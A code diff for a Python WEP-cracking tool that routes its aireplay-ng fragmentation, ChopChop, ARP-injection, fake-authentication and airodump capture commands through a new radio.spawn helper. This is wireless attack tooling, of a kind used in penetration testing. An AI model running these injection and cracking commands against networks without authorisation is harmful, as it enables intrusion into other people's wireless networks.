@@ -25,6 +25,7 @@ import subprocess
 import threading
 from datetime import datetime
 
+from modules import radio
 from modules.banner import C, info, success, warn, error, found, print_section
 
 CAPTURE_DIR        = 'captures'
@@ -173,7 +174,7 @@ def _pipeline_fragmentation(interface, bssid, channel, essid, cap_base) -> str |
     info("This captures a packet and extracts a keystream fragment (.xor file).")
     warn("You may need to press 'y' if prompted by aireplay-ng.")
 
-    frag_proc = subprocess.Popen(
+    frag_proc = radio.spawn(
         ['aireplay-ng', '-5', '-b', bssid, '-h', our_mac, interface],
         stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
         text=True, bufsize=1,
@@ -243,7 +244,7 @@ def _pipeline_fragmentation(interface, bssid, channel, essid, cap_base) -> str |
 
     # Inject crafted ARP packet
     info("Injecting crafted ARP (aireplay-ng -2)...")
-    inj_proc = subprocess.Popen(
+    inj_proc = radio.spawn(
         ['aireplay-ng', '-2', '-r', arp_file, interface],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
     )
@@ -282,7 +283,7 @@ def _pipeline_chopchop(interface, bssid, channel, essid, cap_base) -> str | None
     info("Running ChopChop attack (aireplay-ng -4)...")
     warn("You may need to press 'y' when aireplay-ng asks about a packet.")
 
-    chop_proc = subprocess.Popen(
+    chop_proc = radio.spawn(
         ['aireplay-ng', '-4', '-b', bssid, '-h', our_mac, interface],
         stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
         text=True, bufsize=1,
@@ -345,7 +346,7 @@ def _pipeline_chopchop(interface, bssid, channel, essid, cap_base) -> str | None
         return None
 
     info("Injecting ARP (aireplay-ng -2)...")
-    inj_proc = subprocess.Popen(
+    inj_proc = radio.spawn(
         ['aireplay-ng', '-2', '-r', arp_file, interface],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
     )
@@ -497,7 +498,7 @@ def _start_airodump_wep(interface, bssid, channel, cap_base) -> subprocess.Popen
     # *instead* of the .cap, but the whole pipeline (_iv_monitor_loop /
     # _crack_wep_attempt) cracks <base>-01.cap. IV counts come from the CSV's
     # "# IV" column, so a full .cap gives us both the count and a crackable file.
-    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return radio.spawn(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 def _fake_auth(interface, bssid, essid, our_mac) -> bool:
@@ -540,7 +541,7 @@ def _start_arp_replay(interface, bssid, our_mac) -> subprocess.Popen:
         '-h', our_mac,
         interface,
     ]
-    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return radio.spawn(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
